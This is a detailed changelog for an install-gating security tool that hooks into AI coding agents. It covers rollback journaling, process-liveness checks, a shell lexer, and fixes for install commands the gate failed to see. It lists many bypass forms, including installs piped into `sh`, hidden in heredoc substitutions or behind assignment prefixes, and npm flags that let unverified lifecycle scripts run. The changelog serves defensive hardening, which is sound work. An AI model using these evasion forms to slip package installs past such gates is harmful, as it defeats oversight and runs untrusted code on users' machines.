- **What remains, stated as a range and not as a claim.** The OSV/KEV pass is still per-package. On the same machine with a cold provider cache the gate now crosses 30s near a **390-package** closure. Below that npm's delayed detection is real; above it the runtime kills the gate and the install is not judged. That number is a property of a host, a network, and a cache — the harness is committed so the next reader measures their own instead of inheriting this one.

### An interrupted rollback used to leave nothing at all

The gate cannot deny; by PostToolUse the install has run. Its answer to a bad closure is a rollback, and that rollback wrote its `reorg.log` entry and its message last, after the `node_modules` rebuild — the slowest step.

Measured with `scripts/measure/rollback-kill-state.sh`, which drives both real hooks in a sandbox and kills the post hook at controlled points:

- killed before the rollback: flagged install left in place, `reorg.log` **0 lines**
- killed inside the rollback: project fully reverted, `reorg.log` **0 lines**, no message

The second is the worse one. The first looks like the gate did not run; the second looks like the user's install undid itself for no stated reason, which is how people learn to distrust a gate and route around it.

- **The intent is written before the act.** A journal entry naming the project, the snapshot, the reasons, and the stage is written before the first destructive step and cleared once the rollback has reported itself. An entry that outlives its run *is* the report.
- **The next Bash call reports it — once.** PostToolUse fires on every Bash call, not only on installs, so the report arrives promptly. It moves the entry to `~/.safedeps/rollback-incidents/`, appends `REORG INTERRUPTED` to the same `reorg.log` the finished rollbacks write to, and states which stage was reached and what repairs the tree. Reported once and kept forever, rather than nagged on every later command.
- **This is not atomicity, and does not claim to be.** safedeps does not own the atomicity of an npm tree rebuild. What it owns is whether an unfinished rollback is silent.
- **One message channel.** Engines parse this hook's stdout as a single JSON object, so all of the hook's messages now leave through one emitter; a second object would be a lost message, not an extra one.

### Verification

- `npm test` green. Both directions pinned in the e2e battery: an interrupted rollback is reported, logged, kept as an incident, and not repeated; a completed rollback leaves no journal entry, so a clean run never cries interrupted.
- Ledger index verdicts pinned across owner, transitive, expired, revoked and absent specs, plus an unreadable entry that must not empty the index.
- Both measurement harnesses are committed rather than described, because a number nobody can reproduce is decoration.

### Known gap

Whether the engines kill the hook alone or its whole process tree is **not measured**. Killing the hook process by itself, the `npm ci` it spawned survived and finished the tree; if a runtime kills the process group instead, the tree stays torn. Measuring it means registering a deliberately slow hook on a live machine, which this repo has already had block Bash machine-wide once, so it was left unmeasured on purpose. The journal does not depend on the answer: the record is written before the first destructive act either way.

---

### v2.16.1 — a rollback in progress is not a rollback that failed (patch on v2.16.0)

v2.16.0 made an interrupted rollback loud by writing the journal entry before the first destructive act. Cross-validation of that release found the other side of it: during a rollback the entry is on disk *by design*, and the hook reads the journal on every Bash call, so an unrelated command landing in that window reported a working rollback as interrupted. Reproduced with `scripts/measure/rollback-concurrent-report.sh` — `REORG INTERRUPTED` and `REORG executed` in the same log, plus an incident file and instructions to repair a tree that was about to be fine.

- **The report is gated on liveness, not on a file existing.** "An entry is on disk" and "a rollback did not finish" were the same test; they are now different questions, and the journal has recorded the owner's pid since it was written. The state lock cannot answer this and moving the read inside it would fix nothing: the hook releases the lock before the rollback starts, so the rollback runs unlocked and a second hook would read the same live entry.
- **The check defaults to reporting.** The two ways to be wrong are not symmetric — calling a dead rollback alive suppresses a real report, which is the silence the journal exists to prevent, while calling a live one dead is noise. So it answers "still running" only on positive evidence, and an owner it cannot resolve counts as gone. pid reuse is settled by process start time alone: the owner was running before it wrote its entry, and a pid is recycled only after its previous holder died.
- **The ledger batch tells "could not run" apart from "no misses".** A missing jq, a missing or unparseable closure file, or a failed index build all produced no rows, and no rows is how the caller reads "everything is approved" — the per-package form it replaced failed closed in the same conditions. The status was overloaded (1 meant both a verdict and an error), which is why the caller ignored it. Now 0 no misses, 1 misses found, 2 could not run, matching the audit exit-code contract, and the caller fails closed above 1.

Verification: both directions pinned in the e2e battery — a running rollback stays silent, a dead owner and a recycled pid are both reported, and the batch returns 1/2/2 for unapproved, missing, and unparseable closures. Both fixes mutation-verified by restoring the old behaviour, which turns the new checks red.

Two findings this pass, worth stating because neither was hypothetical. The existing "interrupted rollback" fixture built its entry from inside a subshell, where `$$` is the parent's pid — it described a rollback owned by the live test process and passed only while nothing read the field. And the first version of the batch caller aborted the hook on the ordinary misses-found path, because `set -e` is on and the status is 1; the existing reorg test caught it by going silent rather than red, since the hook died before it could speak.

---

### v2.16.2 — a zombie owner is not a running one (patch on v2.16.1)

v2.16.1 gated the interrupted-rollback report on whether the process that wrote the journal entry is still alive. Cross-validation raised an unreaped owner as a theoretical hole and declined to claim it, because bash reaps its own children and no zombie could be produced to demonstrate it. With a parent that does not wait, it reproduces immediately.

A zombie clears every test the check made. It keeps its process table entry, so `kill -0` succeeds. It keeps its own start time, so the pid-reuse comparison passes. Measured: `stat = Z`, `kill -0` passes, `lstart` resolves, and the check answered "still running".

That is the silent direction, and worse than a single miss. The reachable case is the one the journal exists for: the runtime kills the hook mid-rollback, the parent has not reaped it yet, and the entry belongs to a pid that is now a zombie. A zombie does not go away on its own, so every later command answers the same way and the report is lost for good rather than delayed.

- **A process state of `Z` counts as gone.** One more positive-evidence test on a check that already defaults to reporting.

Verification: the e2e battery grows a fourth direction alongside running, dead, and recycled — a zombie owner is reported. The test builds its own zombie with a non-bash parent, and fails loudly if the platform will not produce one rather than passing on a process that was never a zombie. Mutation-verified by removing the state check, which turns it red.

---

### v2.17.0 — the field nobody read, the state that is neither, and a check that was reporting green

Three loose ends from the v2.16.x round, and one it created.

**A field nobody reads is a field nobody verifies.** Counting read sites across the journal's fields turned up exactly one with none: `stage_at`. The rule that found it came from `pid`, which was written and unread for a release and carried both defects that appeared the moment something finally read it — a fixture that described a live-owned rollback, and the zombie. Being visible in the incident record is not verification; `pid` was visible the whole time.

- **`stage_at` gets a reader, not a deletion**, because it answers a real question. The report now says when the last stage was entered and how far into the rollback that was. It deliberately does not claim how long the rollback sat there: nothing records when the process died, and the report can arrive many commands later, so an interval to now would be mostly idle time. What is knowable still separates "the restores were running" from "the reinstall had been going a while", which call for different repairs.

**A stopped owner is neither dead nor running**, and folding it into the pair is wrong in both directions. Called gone, a rollback that `SIGCONT` would resume is reported as unfinished — the false report v2.16.1 closed. Called running, a rollback stopped forever is never reported — the silence v2.16.2 closed. The asymmetry rule does not reach it either: "an owner that cannot be resolved counts as gone" is about unresolvable owners, and stopped is resolved and neither.

- **It gets its own answer**, the way the pre-guard gave "could not judge" its own answer instead of folding it into safe or unsafe. The report differs because the first move differs: resume or kill, then repair.
- **The zombie match is no longer anchored to the start of the field.** `ps` pads that column differently across platforms; `Z` only ever appears as the state character, so a loose match cannot collide.

**The concept-presence check in the consistency audit was reporting green while the docs drifted.** `grep -lq` over a file list exits on the first match, so one document still carrying a concept passed the whole set. It could only catch "all of them lost it at once" — never drift between them, which is the case that actually happens. That is why the v2.16.1 prose drift had to be caught by a reviewer.

- **Per file now, naming the file**, with `AGENTS.md` in the list since it owns the invariants. Scrubbing the concept from `SKILL.md` leaves the old form green and makes the new form name it.
- **Its ceiling is written beside it, with numbers.** Against the real drift, a vocabulary check misses 2 of 3 and falsely flags 1 — both ARCHITECTUREs were drifted while already containing `pid` from an unrelated paragraph, and the corrected README states the new proposition without the jargon on purpose, since it is user-facing prose. A check that turns it red pushes against the clean-prose convention one section above it. Proposition agreement is not mechanizable and is recorded as re-review's job — a design decision rather than a gap.

Verification: every new behaviour mutation-verified. Folding stopped into gone turns the stopped case red; dropping the `stage_at` read turns the `stage_at` case red. That second regression exists because the first version of this change had none and the mutation passed — adding a reader without a check would have repeated the defect the change is about.

---

### v2.17.1 — the verification procedure had its own shared state (patch on v2.17.0)

Nothing here changes what safedeps does to an install. It changes the machinery that checks it, which had three isolation defects of exactly the kind this tool exists to find.

- **Sandbox names come from `mktemp` now.** Five sites keyed test sandboxes on `$$-$RANDOM`, and `$$` is constant within a run, so isolation rested on `RANDOM` alone — with `mkdir -p` succeeding on an existing directory, a collision was undetectable rather than merely unlikely. That undetectability is the reason for the change, not the collision odds, so it does not need re-arguing when call counts move. The count matters: cross-validation named two sites, the first sweep found four, and a fifth lived in another suite.
- **The stopped-owner test no longer leaks suspended processes.** It suspends a process and resumes it, so a run dying in between left a permanently stopped orphan — measured, four of them, up to 65 minutes old, all holding the plan worktree as their cwd, which stopped a finalize from getting its removal prescription. (`git worktree remove` itself exits 0 in that situation -- review caught the misattribution -- so the machine that refuses is kuma's live-cwd close gate.) Writing code to judge stopped processes leaked stopped processes. Three layers now: an EXIT trap for ordinary exits, a marker-scoped sweep for SIGKILL (which defeats traps, and which is this repo's core scenario rather than a hypothetical), and children spawned outside the worktree so a surviving orphan holds nothing anyone needs to delete.
- **The intermittent `consumer-forms` failure has a committed hunting harness.** Three failures in fifty-two runs, three different assertions, all the same direction: a command that must stay quiet saw an `UNGATED` line. That becomes true either because the sandbox was contaminated or because the verdict is nondeterministic, and those need opposite fixes. The record names its command, so one preserved line settles it — but the suite's trap deleted the sandbox, so every failure so far was re-run blind. The harness keeps it, and carries a `--self-test` that turns a quiet case loud and requires the suite to go red first.

The cause is still unknown, and the `mktemp` change may or may not have removed it. Twenty runs since have been clean, which is close to no evidence: at the observed rate of 3 in 52, twenty consecutive clean runs happen **30% of the time with nothing fixed at all**, and 51 would be needed to claim an improvement at p<0.05. The change stands on its own reason -- a collision was undetectable -- and needs no help from that number.

`AGENTS.md` gains a Verification hygiene section: mutate on a copy rather than in the plan worktree (a validator and an author both hold write access there, and a `git checkout --` restore discards the author's uncommitted work silently), and three rules for citing a zero. All three were measured the wrong way first — a zero from a harness with no control, a trial whose condition was inferred rather than measured, and a label that hardened as it passed between two people while nothing at its origin had been measured. The failure mode behind them: elaboration feels like verification.

### v2.17.2 — the post hook survives a rollback with nothing to restore (patch on v2.17.1)

*Recorded in v2.18.0. v2.17.2 shipped without an entry.*

- **`post-verify` crashed on an empty array.** When the gate had a reason to roll back but no file to restore, it expanded an empty `ROLLED_BACK` array, which bash 3.2 treats as unbound under `set -u`. The hook died instead of reporting, in every session on the machine. The expansion is now guarded the way the same file already guarded it elsewhere.
- **It also published what v2.16.0 through v2.17.1 had changed.** None of those versions was tagged, released or published, and npm had stayed at 2.15.8. The release procedure in `AGENTS.md` exists because of this.

---

## v2.18.0 — the command gate reads an install however it is written (shipped)

Two reports from outside (GitHub #21 and #22, from @Seung-zedd) and a plan paused since August led to measuring the command gate against the spellings package managers document and the shell allows. Most of them passed with no verdict and no record. For pip, cargo, go, gem, maven and nuget the command gate is the only gate, so each of those was a complete bypass. For npm the cost was the `--ignore-scripts` rewrite: a package the effect gate later rejected had already run its install scripts.

### Installs the gate did not recognize

Measured against v2.17.2, each of these passed with an unapproved pin:

- **Documented aliases**: `pnpm i|upgrade|it`, `npm in|ins|inst|insta|instal|isnt|isntall|it|u|udpate|ic|cit|sit`, `yarn up`, `bun a`.
- **Subcommands and options**: `yarn global add`, `yarn workspace <ws> add`, and more than one option before the verb (`pip --quiet install`, `npm --silent --loglevel error install`, `cargo --locked install`, `gem --norc install`).
- **Versioned interpreters**: `pip3.11 install`, `python3.11 -m pip install`, `py -3.11 -m pip install`.
- **Runners**: `npx <pkg>@<ver>` (the pattern had accepted a one-character name only, since June), `npm exec|x`, `pnpx`, `bunx`, `bun x`, `uvx`, `uv tool install|run`, `pipx install|run`, `go run <module>@<version>`, `dotnet tool install`, `cargo +<toolchain>`. Each runner's options come from its own help, so a value is never taken for the package. A value is read whole even when it is a substitution, a quoted path with a blank, or empty (`uvx --python $(which python3) x==1`, `uvx --python "" x==1`). bun's `--cwd`, which `bunx --help` does not list, is read as taking one.
- **Statement positions**: `( ... )`, `{ ...; }`, `if ...; then ...`, `for ...; do ...`, `!`, `time`, `coproc`, `exec`, `env -i`, and `env`, `command` or an assignment after one of those keywords.
- **Quoted and flag-carried specs**: `pip install "requests==2.0.0"`, blanks inside a requirement (`pip install "requests == 2.0.0"`, which pip reads as a pin), extras (`evil[x]==1.0.0`), `===`, `cargo install x --version 1`, `bundle add x --version 1`, `dotnet add <project> package X --version 1`, maven `-Dartifact=g:a:v`.
- **npm's own abbreviations**: npm accepts any unique abbreviation of a command or alias, and the camelCase form of a dashed one, so the documented alias table was never complete: `npm upd x@1`, `npm install-te`, `npm installTest`, `npm si`. The grammar now holds what npm's parser (`lib/utils/cmd-list.js`) accepts, and `scripts/measure/npm-verb-spellings.sh` regenerates that set from the npm on PATH and fails on a spelling the grammar lacks.
- **Initializers**: `npm create|init <pkg>` and `pnpm|yarn|bun create` run a package the manager names itself, usually `create-<pkg>`. They are now runners, and the check names the package that actually runs, following each manager's source: `pnpm create evil@1.0.0` had passed on an approval of `evil`. `npm init` and `npm init -y` stay quiet.
- **`npm link <pkg>`** installs the package globally and is now judged as a global install. A path argument links a local directory and stays quiet.
- **A redirection glued to a spec**: `pip install requests==2.19.0>/dev/null` was read with `>/dev/null` as part of the version. Redirections are now read off the way the shell tokenizes them.

The verb list lived in seven hand-kept copies that had drifted apart. `lib/install-grammar.sh` now defines the grammar once, and every recognizer in both hooks reads it. It keeps ARCHITECTURE.md's rule: a manager's own spelling and the shell's statement grammar are in; argv-passing wrappers (`sudo`, `timeout`, `nohup`, `nice`, `xargs`) are out, and `scripts/test/consumer-forms.sh` pins them as unjudged. `case` arms were on that list until the lexer below; they are judged now. `mvn -Dartifact=... dependency:get` had been pinned as outside on the reading that options before the goal are carrier enumeration; they are not, and it is now recognized.

### Approvals under the wrong identity

The deny message names a `safedeps check` to run, and an agent runs it by itself. Three readings named the wrong package, so the prescription approved something no advisory mentions and the retry passed:

- **Go module paths were cut to their last element.** `go get example.com/x@v1` prescribed `check go x@v1`; once that was approved, any `.../x@v1` passed.
- **Go import paths below a module were checked as they were written.** OSV keys Go advisories by module path, so `go install golang.org/x/text/cmd/gotext@v0.3.7` came back clean while `golang.org/x/text` v0.3.7 is vulnerable. The check now asks OSV for every prefix of the path and merges the answers.
- **Every spec took the command's first ecosystem.** `npm run build && pip install evil==1` checked `evil` as an npm package. Each spec now carries the ecosystem of the statement it came from.

### Quotes and backslashes

The scanner blanks quoted text, so misreading a quote hides whatever follows it from every predicate at once. Four readings did that: `"a\\"` read as an escaped quote; `\"` outside quotes read as an opening quote; a line continuation (`pip \<newline>install ...`) was judged as two lines; and a multi-line quoted string was scanned line by line, so its closing quote opened a new region. The last one also ran the other way, turning a commit message that mentioned an install on its second line into that install. Backslashes and quotes are now read the way the shell reads them, and `\pip install`, the alias-bypass idiom, is an ordinary install.

### A pipe into a shell, beside an install and after it

Two gaps in the pipe carrier, both measured against v2.17.2 and both complete misses for the ecosystems the command gate is the authority for.

- **A visible install switched the pipe check off.** The hidden-install check ran only when the command held no install the gate could read. So `pip install requests==2.0.0 && printf 'pip install evil==6.6.6' | sh`, with `requests` approved, checked `requests` and ran `evil` with no lookup and no record; so did `npm ci && printf 'cargo install evil@6.6.6' | sh`. The check now runs beside a visible install too. It blanks the manager word of every install the gate reads and asks the pipe question of what is left, so the visible install does not count as the hidden one, and a piped install is refused fail-closed, as it always was with nothing beside it. A visible install next to a script piped into a shell with nothing else to install keeps its verdict.
- **The consumer had to be followed by a blank.** `printf 'pip install evil' | sh; echo done` passed unjudged, and so did `| sh&&…`, `| sh|cat`, `(… | sh)`, `{ … | sh; }`, `| (sh)`, `| { sh; }` and `|& sh`. The consumer is now read through the shell's operators and groups. A quoted shell name (`| "sh"`) stays outside the boundary and is pinned there.

### Escaped operators and statement starts

An escaped operator is a character to the shell, and the scanner passed it through as syntax: `echo true \; pip install evil | sh` read as a visible unpinned install -- a record and a pass -- instead of the piped install it is, and `echo a \; pip install evil==6.6.6` was denied for an install the shell never runs. The grammar also treated `!` and `{` as statement openers anywhere, so `echo ! pip install evil | sh` was the same misread. An escaped operator now scans as a plain character, and `!` and `{` open a statement only where one starts.

### A failed scanner is not an empty one

Every predicate reads the scan inside a condition or a command substitution, where `set -e` is off, so an `awk` that failed returned empty text, and empty text read as "no install". The first fix recorded the failure and re-judged the command at the two allow exits with a second recognizer. Review rejected it three times, and a design judgment measured why: the second recognizer ran through `grep`, `sed` and the join `awk`, so it went quiet with the tools it stood in for; a raw regex cannot match everything the scanned recognizers match; and the inert rewrite read the command after the last settle point. Injecting a failure into each reading one at a time found 43 weakened verdicts in 3,530 runs on the integration tree.

The design now has one gate. Every path that lets a command run crosses it once, after its last reading and before its first side effect: pending state, the inert meta, the allow. If any reading failed, a command that names a package manager's executable anywhere, in any case, is denied as `UNDECIDED`; anything else runs with the failure on stderr and in `advisory.log`. The test is bash's own regex over the grammar's executable list (`SAFEDEPS_G_EXECUTABLES`), with no subprocess. A deny that would report a finding after a failed reading reports `UNDECIDED` instead, because a finding read from partly missing text is not one. The inert rewrite is decided before the gate, and nothing is written for a command the gate denies.

`scripts/measure/scan-failure-census.sh` is how this is measured rather than argued. It fails every reading one at a time, from each reading onward, by kind, and all `awk` at once, then compares each run with the clean one and counts weakened and mislabeled verdicts, readings after the gate, and pending state left by a deny. `npm test` runs a quick subset. On the v2.18.0 integration tree the quick census ran 32 cases and 3,041 failing runs on macOS (bash 3.2) and on Linux (bash 5.2). Both counted zero weakened, mislabeled, error, after-gate and pending-on-deny verdicts, and zero unmarked, unlisted or unstable readings; 2,772 runs ended `UNDECIDED` and 269 kept their clean verdict.

The same class held for `grep` and `sed`, and it predates this release: a predicate read a grep or sed that never answered as "no match". With either tool failing, `pip install requests==2.0.0`, `npm install left-pad@1.3.0` and `cargo add serde@1.0.0` passed with no verdict. Judgment greps now go through one wrapper that tells "no match" (1) from "did not answer" (2 and up) and records the second; a failed `sed` in normalization, the runner reader and the inert rewrite is recorded too. The gate settles them like a failed `awk`.

### One reading of the command, the way the shell lexes it

Three state machines read the command in turn and had to agree: a line-based heredoc pattern, a line joiner and the quote scanner. Across three review rounds they did not. A heredoc was stripped twice, opened where there was none (a herestring, an arithmetic shift, a quoted `<<EOF`), or not opened where there was one (a digit delimiter, a multi-line string closing on the line that opens it). Each time, every line after it vanished from the gate. Of the 115 forms below, 111 have a last line that bash, zsh or the agent's own shell runs. v2.17.2 let 60 of those 111 through with no verdict. Now it is 0. Each count is `bash scripts/test/shell-reading.sh --count`, run with the battery and its forms copied into a checkout of that tree. The same class sat beside heredocs, in an apostrophe inside a comment and in `$'don\'t'`. A command substitution in an unquoted heredoc body is code the shell runs, and it was stripped with the body: `cat <<EOF`, a body line `$(pip install evil==6.6.6)`, then `EOF`, passed with no verdict.

`shell_lex` is now the one reader: a single `awk` pass that follows the lexical state the shell keeps and gives every byte a class. Every other reader takes a view of that pass. The predicates read a scan view with quoted text, comments and heredoc bodies blanked, the payload readers read a code view that keeps quotes, and line-based readers read a joined view without continuations. Where bash and zsh read a command differently, each divergence is an axis of its own, and the gate judges every combination of the axes a command flags. Two divergences tied to one switch had judged only two of the four combinations, and missed the one zsh makes (caught in review). A heredoc body is walked by the same lexer, so a substitution in it may span lines, nest or hold a `case`. A command that never closes is a failed reading, so it is `UNDECIDED` when it names a package manager. The inert rewrite now places `--ignore-scripts` from the scan view, by byte offset. Because readers take offsets from the scan and code views and may read them again, scan-contract checks that both keep the command's byte length and read the same a second time, on every recorded form and on random input. That check found two ways the scan view changed on a second reading, an escaped quote left as a bare quote and a `#` after a blanked region turning into a comment, and both are fixed.

`scripts/measure/shell-reading-forms.json` records each form with the values bash, zsh, sh and the agent's own zsh wrapper produced for it. `scripts/test/shell-reading.sh`, in `npm test`, requires a finding on every form a shell runs to its last line, and that the one data form stays data. During review each rule of the lexer was taken out in turn, and each mutant turned a battery red: comment, quote and body state, both arithmetic readings, the two divergence axes, delimiter quoting, `<<-` tabs, digit delimiters, nesting inside double quotes, heredoc bodies, case patterns, and the unterminated backstop (which consumer-forms catches). The lexer's scan, measured with `scripts/measure/scan-cost.sh` on the release tree, costs 0.05s at 8KB, 0.12s at 32KB and 0.21s at 64KB on macOS and 0.02s, 0.05s and 0.08s on Linux ("Faster" below has the hosts).

### Each reading is a shell: bash, zsh and dash

The lexer read a command as one shell plus a reading per divergence it had flagged, and that set could not close. zsh decides `((` at each site, so one command held a subshell `((` and an arithmetic one. Readers after the join lexed a zsh reading again under bash's rules and hid the line a second time: `echo "${x:-'}"; <install>; echo "'}"`, which zsh and the agent's wrapper run, passed with no verdict, though v2.17.2 denied it. And dash, which reads a `sh -c` script on Linux, reads `((` like bash and the apostrophe like zsh. Now each reading is a shell, every reader of the command reads inside one reading, and the gate judges the union. The zsh and dash readings run only where the bash reading passes a place the shells read differently. `--ignore-scripts` goes in only where all three put the npm installs in the same place; otherwise the command is `UNDECIDED`. ARCHITECTURE.md has the table of those places.

Verification: every form in `scripts/measure/shell-reading-forms.json` (186) carries values measured on macOS (bash 3.2, zsh 5.9, sh, dash, the agent's wrapper) and Linux (bash 5.2, dash 0.5.12); wherever a shell ran a form's last line, that shell's reading shows it (925 shell runs) and the gate gives a verdict. 400 seeded random forms (`scripts/measure/shell-reading-fuzz.sh`, seed 20261001): no reading missed a line a shell ran, on macOS (220 such forms) or Linux (187), and the gate passed none of them. The palette holds a `#` in the middle of a word, line continuations before a `#` and a glob close since the comment boundary was fixed, so these counts replace the 249 and 190 of the palette before it. One form it drew (an arithmetic left open in a heredoc body, before the install) passed the gate until a context left open at the end of a body became body data. Ten mutations of the readings, each on a copy, each turned the battery red on the rows it should. Replaying the verdict corpus plus 200 random commands at two seeds against the tree before this moved 17 verdicts, all from pass to deny, all named forms; nothing moved from deny to pass.

Cost, `scripts/measure/scan-cost.sh` on the Linux VM (best of 5, load 0.03 to 7.2), against the tree before: a command with no install is within 1-5% (one cell +11% while the load rose); a denied install with no place where the shells differ is 3-9% faster; one with such a place reads three times and costs 1.8x at 100 bytes, 2.0x at 8KB, 2.3x at 32KB and 2.7x at 128KB (17.0s at 128KB, inside the 20s self-budget; a larger one crosses it sooner than before and is `UNDECIDED` there).

### An install behind an assignment prefix

`FOO="a b" pip install evil==6.6.6` passed with no verdict and no record, on v2.17.2 and on every branch of this release until it was found. So did the same install behind `FOO='a b'`, `FOO=$(printf x)`, a backtick, `FOO=a\ b`, `FOO=${BAR:-a b}` or `env FOO="a b"`. For the ecosystems the command gate is the authority for, that was a complete bypass. The prefix stripper read an assignment value as the bytes up to the first blank or quote, so any value with a blank in it kept its prefix in front of the install, and the install was never recognized. Assignment, `env`, `command` and `exec` prefixes are now read off the lexer, where a value is one word however it is quoted or nested. An install inside a substitution in a value is still read; an install named only in a quoted value is data.

Beside a pipe, the same prefix produced the opposite error: `PIP_INDEX_URL=x pip install requests==2.0.0 && printf 'hi' | zsh -s`, with `requests` approved, was denied as an install piped into a shell. The blanking pass now steps over prefixes, takes the manager word only as a whole word, and blanks the install's own assignment names and plain values.

### The inert flag landed inside a comment

`npm ci # rebuild the lockfile` became `npm ci # rebuild the lockfile --ignore-scripts`. The shell drops a comment, so npm never saw the flag and the lifecycle scripts ran, while the meta recorded them as suppressed. A heredoc or a second line did the same: the flag landed after the terminator or on the last line. The rewrite now goes directly after the install verb whenever the command holds a `#`, a second line, or a chained statement outside quotes. This was true from the first inert release and was found during the design judgment above.

The verb is found on the lexer's view of the code the shell runs, so a verb in a comment, a quoted string or a heredoc body is never rewritten. That view first left out the scripts a command hands to a shell, and an install in `sh -c '...'` beside a visible one ran its lifecycle scripts while the visible one was made inert (caught in integration). The flag now also goes inside `sh -c`, `bash -c` and `eval` scripts whose bytes are the bytes the inner shell reads, and inside a substitution in quotes. This fixes a gap that predates the release as well: a lone `sh -c 'npm install x'` took the append path, where the flag becomes the script's `$0`. An npm install the rewrite cannot reach, in a double-quoted script with an escape or a heredoc piped into a shell, is recorded as a downgrade to detect-and-rollback.

### npm installs the effect gate could not see

The effect gate reads the project's `package-lock.json`, and its exemption from the `UNGATED` record assumed every npm CLI install in a project writes there. Measured end to end against a local registry with the real npm and a synthetic package whose lifecycle scripts leave a trace, several did not:

- `--no-save`, `--save=false`, `npm_config_save=false`, `--package-lock false` and `npm_config_package_lock=false` leave the lockfile alone and record the install only in `node_modules/.package-lock.json`. The gate judged the project clean, and the inert rebuild that follows a clean verdict ran the unverified package's preinstall, install and postinstall scripts.
- `-C <dir>` and `cd <dir> && npm install` write the lockfile of another directory, which the gate did not read.
- `npm_config_global=true` installs globally, with no lockfile and no record.

The gate now reads the closure from the union of the lockfile and the hidden lockfile, and rebuilds only when the hidden lockfile exists, pinned to the project (`--global=false --location=project`), so a project `.npmrc` with `global=true` cannot turn the rebuild global. The pre-install gate follows where each install statement lands (`-C`, a literal `cd` or `pushd`, `env -C`) and records the ones it cannot follow. An install is exempt from the record only when every install statement lands where the gate reads. Quoted `--prefix` and `--cwd` values are read the way the shell reads them. `scripts/test/lockless-forms.sh` pins all of it against a local registry.

Predicting where an install lands then failed in three review rounds, each with a silent pass: a `cd` that never ran, `command cd`, a symlinked workspace member. Two changes replaced the prediction. The directory is chosen by asking npm, with `npm prefix` and `npm root` run where the command runs npm and with the statement's own arguments and environment; that ask never runs the command's code (below). And an install counts as read only when that directory shows this call's install trace. Just before the command, the pre-guard touches a baseline file and notes the inode of both lockfiles there; the post hook counts a lockfile `find -newer` than the baseline, or one with another inode, as the trace. Where neither shows one, the install is recorded `UNGATED` ("no install trace in <dir>") and nothing is rebuilt there, so a wrong prediction is a record rather than a silent pass. `scripts/test/install-dir-differential.sh` holds the gate to `npm prefix` over 237 layouts, and `scripts/test/effect-trace-grid.sh` runs the trace end to end.

### An install that saves nothing has its sources and install scripts checked

The effect gate's source check (non-standard and insecure resolved URLs) and its install-script heuristics ran only when `package-lock.json` or `package.json` changed. An install that saves nothing changes neither: `npm install --no-save`, `npm_config_save=false npm install`, a tarball named on the command line. So a tarball carrying an approved name and version, from a `file:` path or an http URL, passed both, and on Claude Code the inert install's rebuild ran its scripts; so did an approved package whose install script the heuristics flag when it is saved. The closure check read the hidden lockfile already, but it names packages by name and version, which the impostor shares.

Both checks now read what either npm record holds that no record held before the command. The pre-guard keeps a copy of `node_modules/.package-lock.json` beside the one of `package-lock.json`, and the post hook compares both records with both copies, read together. A rollback names the source that caused it: the record and the resolved URL, up to three of them.

Two behaviour changes come with it:

- A project with no lockfile and no installed tree has no earlier record, so everything its first install brings in is new. A source outside the public registries (a private registry, a git URL, a tarball) is now rolled back there, as it already was when added to a project that had a lockfile. It used to pass only because there was no snapshot to compare with.
- A committed lockfile is installed as recorded. `npm ci` in a fresh clone, or a bare `npm install` that follows the lockfile, installs the sources the lockfile names, an edited one included. Checking committed sources would roll back the first `npm ci` of every project that installs from a private registry, a git URL or a tarball, with no way to approve a source. That is left for a later release, and README and ARCHITECTURE state it as a boundary.

Verification: `scripts/test/effect-trace-grid.sh` section 1a, against a real npm and the local registry. The unsaved forms (C1, C3, C5, C6, H2) are rolled back with no impostor script run, and red on the tree before the change (Linux, npm 10.8.2: 17 failed expectations across those rows and a Codex C5); the saved controls (C2, C4, H1) and the rows that must not roll back (C0, a fresh clone's `npm ci` with a registry and with a tarball dependency, an installed tree with a pulled lockfile) hold on both. The 50-entry count stays on `package-lock.json`, because with no earlier record every first install of a project with more than 50 dependencies would cross it.

### Install scripts are allowed by a check of the whole tree

Install scripts ran in two places, and both ran over the whole tree: the rebuild after an inert install, and the reinstall the rollback ran. Both were allowed by the judgment that nothing this command brought in was rejected, and three holes in that judgment in a row each became a script that ran. The last one was a rollback. A project with no confirmed snapshot is rolled back to the state from before the command, and when that state held the rejected package, the rollback's `npm ci` ran its scripts: a fresh clone whose committed lockfile held it (RB1), a lockfile that held it before an approved install (RB2), one an earlier `UNGATED` install had written (CH2b). Its message said "rolled back to the last confirmed safe snapshot" all the same. The same judgment let the rebuild run an edited committed lockfile's tarball (L1 under `npm ci`, L2 under a bare `npm install`) and a directory an earlier `UNGATED` install had linked (CH1b).

So the permission moved off the change and onto the tree:

- The rebuild runs only when every package npm would rebuild is on record, every package under `node_modules` is recorded with a public-registry https source (or is bundled by its parent), and every directory outside it is a declared workspace member. Otherwise the whole rebuild is skipped, and a warning names each package or directory by kind. Nothing is rolled back for it.
- Bundling is read from the tree. A nested package counts as bundled only when its parent passes the check itself and the parent's own `package.json` on disk bundles it, and no record of it names a non-public source. The lockfile's `inBundle` is not read: a committed record could set it, and npm writes it for whatever the root project bundles, and either way a tarball from an http URL passed as bundled (NB1, NB2).
- The rollback runs no package manager, so no script runs in it (CH3c; "A rollback runs no package manager" below). With no confirmed snapshot, the message, `reorg.log` and `advisory.log` say there was no confirmed snapshot and that the restored state may still hold what was rejected. On Codex they also say that the install's own scripts already ran, since Codex cannot make the install inert.

What users see change: a project whose tree holds a package not recorded as coming from the public registry (a private registry, a git URL, a tarball, or a lockfile written with `omit-lockfile-registry-resolved`), or a `file:` directory dependency that is not a declared workspace member, is installed and not rebuilt. The rebuild is all or nothing, so the approved packages' scripts do not run either; the warning names what stopped it, and the user runs `npm rebuild` after reviewing it. In v2.17.2 an install in a project with a committed `file:` directory dependency was rolled back instead (measured on main with npm 10.8.2). Approving a source, and rebuilding only the packages that pass, are left for a later release.

Verification: `scripts/test/effect-trace-grid.sh` section 1d, against a real npm and the local registry (Linux, npm 10.8.2). RB1, RB2, CH2b and a Codex RB1 roll back with no script run and say "no confirmed snapshot" in all three records; CH3c and a Codex CH3c roll back to a confirmed snapshot with `node_modules` removed and no script run; CH1b, L1, L2, K4-K7 and OM1 are kept with a warning and no script run; K8, K9, NS1 and a public package with a bundled dependency (BD1) are quiet and rebuilt. On a tree from before the change RB1, RB1x, RB2, CH2b, CH1b, L1 and L2 ran the rejected scripts and failed 47 expectations in all, K4-K7 and OM1 among them. Dropping the source and directory check turns its rows red (CH1b, L1, L2). Two more mutations were measured while the rollback still reinstalled, scripts back on in its `npm ci` and a rebuild after a rollback with no confirmed snapshot (RB1, RB1x, RB2, CH2b each time); the rollback now has no npm left to mutate, and the rows hold that it runs none.

